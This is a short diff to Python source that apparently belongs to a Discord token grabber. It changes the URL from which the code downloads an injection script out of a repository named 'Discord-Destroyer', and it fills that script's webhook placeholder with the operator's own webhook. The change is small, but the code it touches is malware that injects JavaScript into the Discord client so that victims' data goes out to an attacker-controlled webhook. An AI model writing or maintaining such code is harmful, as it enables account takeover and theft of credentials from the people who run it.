@@ -35,7 +35,7 @@ class Start:
                                 except PermissionError:
                                     pass
                             f = httpx.get(
-                                "https://github.com/DARKNOSY/Discord-Destroyer/raw/main/inject.js"
+                                "https://github.com/DARKNOSY/Discord-Destroyer/raw/main/injection.js"
                             ).text.replace(
                                 "webhook: '%WEBHOOK%'", f"webhook: '{self.Webhook}'"
                             )
